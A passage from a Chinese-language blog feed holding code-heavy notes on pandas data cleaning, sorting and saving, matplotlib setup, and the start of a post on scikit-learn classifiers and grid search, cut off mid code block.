class="string">&#x27;DATA_DATE&#x27;</span>]&gt;=<span class="string">&#x27;2021-01-01&#x27;</span></span><br><span class="line"><span class="comment"># 设置结束时间</span></span><br><span class="line">to_date = df[<span class="string">&#x27;DATA_DATE&#x27;</span>]&lt;=<span class="string">&#x27;2021-03-31&#x27;</span></span><br><span class="line"><span class="comment"># 筛选数据时间段</span></span><br><span class="line">df = df[from_date&amp;to_date]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算日期加减：</span></span><br><span class="line">beg = end - pd.Timedelta(days=<span class="number">6</span>)</span><br></pre></td></tr></table></figure><ul><li>排序问题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line"><span class="comment"># 先按着A列的值升序，再按着B的顺序降序</span></span><br><span class="line">df.sort_values([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>],ascending=[<span class="literal">True</span>,<span class="literal">False</span>])</span><br></pre></td></tr></table></figure><ul><li>对df进行自定义排序</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">数据量小的情况</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">&#x27;B&#x27;</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line"><span class="comment"># 将索引0和索引3的顺序对调</span></span><br><span class="line">indx = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="comment"># 如果index过长,可以通过.index获取</span></span><br><span class="line">df.index</span><br><span class="line"><span class="comment"># 使用reindex实现</span></span><br><span class="line">df.reindex(indx)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">数据量大的情况</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#df[1:3] = df[3:1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># index 索引重排序</span></span><br><span class="line">frame.swaplevel(<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>)</span><br><span class="line"><span class="comment"># 对多个索引排序，按照名称</span></span><br><span class="line">frame.sort_index(level=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 按照索引值排序</span></span><br><span class="line">frame.sort_index()</span><br></pre></td></tr></table></figure><h2><span id="保存文件">保存文件</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不保存索引</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,index = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 保存指定列</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,columns=[<span class="string">&#x27;positionName&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>])</span><br><span class="line"><span class="comment"># 小数点</span></span><br><span class="line">mar.to_csv(<span class="string">&quot;2-1.csv&quot;</span>, index=<span class="literal">False</span>, float_format=<span class="string">&#x27;%.3f&#x27;</span>)</span><br></pre></td></tr></table></figure><h2><span id="tricks">Tricks</span></h2><ul><li>异常值分析</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先看数据，后面na_values后期填写</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;xx.csv&#x27;</span>,na_values=[])</span><br><span class="line"><span class="comment"># 每个col去看它的unique()值是否有非法字符，如果有就添加到na_values中</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> df.columns:</span><br><span class="line">  <span class="built_in">print</span>(df[c].unique())</span><br><span class="line"><span class="comment"># 使用head和info查看数据 数值型的数据</span></span><br><span class="line">df.head()</span><br><span class="line">df.info()</span><br><span class="line"><span class="comment"># 如果发现数值数据却是object类型，则转为int/float</span></span><br><span class="line">df.a = df.a.astype(<span class="string">&#x27;int&#x27;</span>)</span><br><span class="line"><span class="comment"># 如果提示错误，则可以从错误提示中找到非法字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果是需要 条件替换的时候</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    mean = df[~(df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>)][<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)].mean()</span><br><span class="line">    indx = df[df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>].index.tolist()</span><br><span class="line">    df.loc[indx,<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)] = mean</span><br><span class="line">    <span class="comment"># 写成这样不行 因为取不到引用</span></span><br><span class="line">    df[df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>][<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)] = mean</span><br><span class="line">    <span class="comment">#使用loc可以取 但是[]不行</span></span><br><span class="line">    <span class="built_in">print</span>(df[~(df[<span class="string">&#x27;v_&#x27;</span>+<span class="built_in">str</span>(i)]==<span class="number">0</span>)].shape)</span><br></pre></td></tr></table></figure><ul><li>数据分析&amp;处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isnull() is an alias for isna </span></span><br><span class="line"><span class="comment"># 计算缺失值</span></span><br><span class="line">df.isna().<span class="built_in">sum</span>().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># 每列有多少缺失值</span></span><br><span class="line">df.isnull().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># 查看缺失值</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"><span class="comment"># 将评价人数列的缺失值，用整列的均值进行填充mean mode median</span></span><br><span class="line">df[<span class="string">&#x27;评价人数&#x27;</span>] = df[<span class="string">&#x27;评价人数&#x27;</span>].fillna(df[<span class="string">&#x27;评价人数&#x27;</span>].mean())</span><br><span class="line"><span class="comment"># 现在将评分列的缺失值，替换为上一个电影的评分</span></span><br><span class="line">df[<span class="string">&#x27;评分&#x27;</span>] = df[<span class="string">&#x27;评分&#x27;</span>].fillna(axis=<span class="number">0</span>,method=<span class="string">&#x27;ffill&#x27;</span>)</span><br><span class="line"><span class="comment"># 将评价人数列的缺失值，用上下数字的均值进行填充</span></span><br><span class="line">df[<span class="string">&#x27;评价人数&#x27;</span>] = df[<span class="string">&#x27;评价人数&#x27;</span>].fillna(df[<span class="string">&#x27;评价人数&#x27;</span>].interpolate())</span><br><span class="line"><span class="comment"># 在填充 “语言” 列的缺失值，要求根据 “国家/地区” 列的值进行填充</span></span><br><span class="line">df[<span class="string">&#x27;语言&#x27;</span>]=df.groupby(<span class="string">&#x27;国家/地区&#x27;</span>).语言.bfill()</span><br><span class="line"><span class="comment"># 查找重复值</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"><span class="comment"># 查找指定列的重复值</span></span><br><span class="line">df[df.duplicated([<span class="string">&#x27;片名&#x27;</span>])]</span><br><span class="line"><span class="comment"># 删除全部的重复值</span></span><br><span class="line">df = df.drop_duplicates()</span><br><span class="line"><span class="comment"># 删除全部的重复值，但保留最后一次出现的值first/last/false</span></span><br><span class="line">df = df.drop_duplicates(keep = <span class="string">&#x27;last&#x27;</span>)</span><br><span class="line"><span class="comment"># 计算各省市出现的次数</span></span><br><span class="line">df.省市.value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># fillna 传字典</span></span><br><span class="line">pretreat=pretreat.fillna(&#123;<span class="string">&#x27;v_0&#x27;</span>:df_mean.v_0,</span><br><span class="line">          <span class="string">&#x27;v_1&#x27;</span>:df_mean.v_1,</span><br><span class="line">          <span class="string">&#x27;v_2&#x27;</span>:df_mean.v_2,</span><br><span class="line">          <span class="string">&#x27;v_3&#x27;</span>:df_mean.v_3,</span><br><span class="line">          <span class="string">&#x27;v_4&#x27;</span>:df_mean.v_4,</span><br><span class="line">          <span class="string">&#x27;v_5&#x27;</span>:df_mean.v_5,</span><br><span class="line">          <span class="string">&#x27;v_6&#x27;</span>:df_mean.v_6,</span><br><span class="line">          <span class="string">&#x27;v_7&#x27;</span>:df_mean.v_7,</span><br><span class="line">           <span class="string">&#x27;v_8&#x27;</span>:df_mean.v_8,</span><br><span class="line">          <span class="string">&#x27;v_9&#x27;</span>:df_mean.v_9,</span><br><span class="line">          <span class="string">&#x27;v_10&#x27;</span>:df_mean.v_10,</span><br><span class="line">          <span class="string">&#x27;v_11&#x27;</span>:df_mean.v_11,</span><br><span class="line">          <span class="string">&#x27;v_12&#x27;</span>:df_mean.v_12,</span><br><span class="line">          <span class="string">&#x27;v_13&#x27;</span>:df_mean.v_13,</span><br><span class="line">          <span class="string">&#x27;v_14&#x27;</span>:df_mean.v_14</span><br><span class="line">          &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dropna: axis=1删除列，axis=0删除行</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 删除整行缺失的数据，剩余缺失数据按0值进行填充</span></span><br><span class="line">df2 = df2.dropna(how=<span class="string">&#x27;all&#x27;</span>).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 删除某列为空的行</span></span><br><span class="line">df_initial.dropna(axis = <span class="number">0</span>, subset = [<span class="string">&#x27;客户ID&#x27;</span>], inplace = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>哑变量操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">哑变量操作</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">&quot;object&quot;</span>].tolist() </span><br><span class="line"><span class="comment"># 或者自己指定想要成为哑变量的列</span></span><br><span class="line">cate = [<span class="string">&#x27;col1&#x27;</span>,<span class="string">&#x27;col2&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cate:</span><br><span class="line">    df = pd.concat([df,pd.get_dummies(df[c],prefix=<span class="built_in">str</span>(c))],axis=<span class="number">1</span>)</span><br><span class="line">    df.drop(c,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 解决int不能哑变量问题，一行solution</span></span><br><span class="line">pd.get_dummies(df,columns=[<span class="string">&#x27;用电类别&#x27;</span>,<span class="string">&#x27;用电类别&#x27;</span>,<span class="string">&#x27;年&#x27;</span>,<span class="string">&#x27;月&#x27;</span>]).info()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">data[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]] = data[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]].astype(<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">data = pd.get_dummies(data)</span><br></pre></td></tr></table></figure><ul><li>统计空值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用apply实现</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,np.nan,np.nan],<span class="string">&#x27;B&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,np.nan]&#125;)</span><br><span class="line">df1.apply(<span class="keyword">lambda</span> x:x.size - x.count())</span><br><span class="line"><span class="comment"># 使用isna、isnull实现</span></span><br><span class="line">df1.isna().<span class="built_in">sum</span>() <span class="comment">#isna()返回的是个bool类型的矩阵，进行加和运算True默认为1，False默认为0，因此可以通过sum()函数来统计</span></span><br><span class="line"><span class="comment"># 统计每个空值的比例</span></span><br><span class="line">df1.isna().mean() <span class="comment"># mean() 相当于 True的个数/sum()的个数</span></span><br></pre></td></tr></table></figure><ul><li>计算最近的数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过abs来计算距离，然后通过sort_values来算最小的数</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x:<span class="built_in">abs</span>(x-<span class="number">1</span>)).sort_values()</span><br></pre></td></tr></table></figure><h2><span id="matplotlib">matplotlib</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fig,axis = plt.subplots(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h2><span id="tips">Tips</span></h2><h3><span id="屏蔽提醒">屏蔽提醒</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="显示中文">显示中文</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win设置中文</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mac设置中文</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;Heiti TC&#x27;</span><span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#用来正常显示负号</span></span><br></pre></td></tr></table></figure><h3><span id="关于iloc和选择赋值失败问题">关于iloc和[]选择赋值失败问题</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">&#x27;2018-07&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] 取出数字，不能赋值</span><br><span class="line">df.loc[<span class="string">&#x27;2018-07&#x27;</span>][<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">df.iloc[<span class="number">10</span>,<span class="number">1</span>]</span><br><span class="line">df.iloc[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">df.iloc[-<span class="number">31</span>:][<span class="string">&#x27;DailyElectricity&#x27;</span>]=<span class="number">0</span></span><br><span class="line">和</span><br><span class="line">df[-<span class="number">31</span>:][<span class="string">&#x27;DailyElectricity&#x27;</span>]=<span class="number">0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;均不能改变原df</span></span><br><span class="line"><span class="string">因为他们仅仅是取出来的值，而不是引用&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给一个Series赋值另外一个Series需要reset_index() （保证index相同）</span></span><br></pre></td></tr></table></figure><ul><li>Jupyter</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">np.add? <span class="comment"># 显示帮助</span></span><br><span class="line">np.add?? <span class="comment"># 显示源代码</span></span><br><span class="line"><span class="comment"># fsting用法 python&gt;=3.6</span></span><br><span class="line">number = <span class="number">7</span></span><br><span class="line"><span class="string">f&#x27;My lucky number is <span class="subst">&#123;number&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="pandas" scheme="https://disda-coding.github.io/categories/pandas/"/>
    
    
    <category term="大数据" scheme="https://disda-coding.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>机器学习基础</title>
    <link href="https://disda-coding.github.io/2022/03/07/MachineLearning/"/>
    <id>https://disda-coding.github.io/2022/03/07/MachineLearning/</id>
    <published>2022-03-07T09:22:02.000Z</published>
    <updated>2023-03-29T01:03:30.404Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93">算法总结</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86">数据预处理</a></li><li><a href="#%E5%88%86%E7%B1%BB">分类</a><ul><li><a href="#%E5%9B%9E%E5%BD%92%E6%A0%91">回归树</a></li><li><a href="#%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97">随机森林</a></li><li><a href="#%E6%A2%AF%E5%BA%A6%E6%8F%90%E5%8D%87%E6%A3%AE%E6%9E%97">梯度提升森林</a></li><li><a href="#svc%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E9%9C%80%E8%A6%81%E6%A0%87%E5%87%86%E5%8C%96-%E6%89%BE%E5%B0%91%E6%95%B0%E7%B1%BB%E7%9B%B8%E5%AF%B9%E6%93%85%E9%95%BF">SVC(支持向量机需要标准化) 找少数类相对擅长</a></li><li><a href="#%E5%88%86%E7%B1%BBonekey">分类OneKey</a></li><li><a href="#%E5%88%86%E7%B1%BB%E8%B0%83%E5%8F%82onekey">分类调参Onekey</a></li></ul></li><li><a href="#%E6%A8%A1%E6%9D%BF">模板</a><ul><li><a href="#%E6%B3%B0%E5%9D%A6%E5%B0%BC%E5%85%8B">泰坦尼克</a></li><li><a href="#%E8%B0%83%E4%BC%98">调优</a></li><li><a href="#ridge">Ridge</a></li><li><a href="#lasso">Lasso</a></li><li><a href="#%E5%A4%9A%E6%AD%A5%E9%95%BF%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97">多步长时间序列</a></li></ul></li><li><a href="#%E8%B8%A9%E5%9D%91">踩坑</a></li><li><a href="#trick">Trick</a></li></ul><!-- tocstop --><h2><span id="算法总结">算法总结</span></h2><table><thead><tr><th>分类</th><th>回归</th></tr></thead><tbody><tr><td>分类树<strong>tree.DecisionTreeClassififier</strong></td><td>回归树<strong>tree.DecisionTreeRegressor</strong></td></tr><tr><td>随机森林<strong>ensemble.RandomForestClassifier</strong></td><td>回归森林<strong>ensemble.RandomForestRegressor</strong></td></tr><tr><td>逻辑回归<strong>linear_model.LogisticRegression</strong></td><td></td></tr><tr><td>KNN <strong>neighbors .KNeighborsClassifier</strong></td><td></td></tr><tr><td>Naive Bayes</td><td></td></tr><tr><td>梯度提升树<strong>ensemble.GradientBoostingRegressor</strong></td><td></td></tr><tr><td>SVC <strong>svm.SVC</strong></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(X, Y, test_size=<span class="number">0.3</span>,random_state=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>不对分类型变量做无量纲化处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">col = X.columns.tolist()</span><br><span class="line">cate = X.columns[X.dtypes == <span class="string">&quot;object&quot;</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cate:</span><br><span class="line">    col.remove(i)</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">ss = StandardScaler()</span><br><span class="line">ss = ss.fit(X.loc[:,col])</span><br><span class="line">X.loc[:,col] = ss.transform(X.loc[:,col])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.describe([<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br></pre></td></tr></table></figure><ul><li>训练集特征和预测集特征plot一下，看看分布像不像，看看后面需要防止过拟合，交叉验证。</li></ul><h2><span id="数据预处理">数据预处理</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 观察连续变量，distplot</span></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">sns.distplot(dataset_raw[<span class="string">&#x27;fnlwgt&#x27;</span>])</span><br></pre></td></tr></table></figure><h2><span id="分类">分类</span></h2><h3><span id="回归树">回归树</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化一个分类器</span></span><br><span class="line">clf = tree.DecisionTreeClassifier()</span><br><span class="line"><span class="comment"># 训练</span></span><br><span class="line">clf = clf.fit(Xtrain, Ytrain)</span><br><span class="line"><span class="comment"># 评价结果</span></span><br><span class="line">score = clf.score(Xtest, Ytest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 学习曲线</span></span><br><span class="line">n = np.linspace(<span class="number">5</span>,<span class="number">16</span>,<span class="number">10</span>) </span><br><span class="line">score=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> n:</span><br><span class="line">    clf = DecisionTreeClassifier(max_depth=i)</span><br><span class="line">    score.append(cross_val_score(clf,X,y,cv=<span class="number">10</span>).mean())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(score), <span class="built_in">int</span>(n[score.index(<span class="built_in">max</span>(score))]))</span><br><span class="line">plt.plot(n,score)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网格搜索</span></span><br><span class="line">gini_thresholds = np.linspace(<span class="number">0</span>,<span class="number">0.5</span>,<span class="number">20</span>)</span><br><span class="line">parameters = &#123;</span><br><span class="line">    <span class="string">&quot;criterion&quot;</span>:(<span class="string">&#x27;gini&#x27;</span>,<span class="string">&#x27;entropy&#x27;</span>)</span><br><span class="line">    ,<span class="string">&quot;splitter&quot;</span>:(<span class="string">&#x27;best&#x27;</span>,<span class="string">&#x27;random&#x27;</span>)</span><br><span class="line">    ,<span class="string">&#x27;max_depth&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_samples_leaf&#x27;</span>:[*<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>,<span class="number">5</span>)]</span><br><span class="line">    ,<span class="string">&#x27;min_impurity_decrease&#x27;</span>:[*gini_thresholds]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">clf = DecisionTreeClassifier(random_state=<span class="number">25</span>)</span><br><span class="line">GS = GridSearchCV(clf,parameters,cv=<span class="number">10</span>)</span><br><span class="line">GS.fit(Xtrain,Ytrain)</span><br></pre></td></tr></table></figure><h3><span id="随机森林">随机森林</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 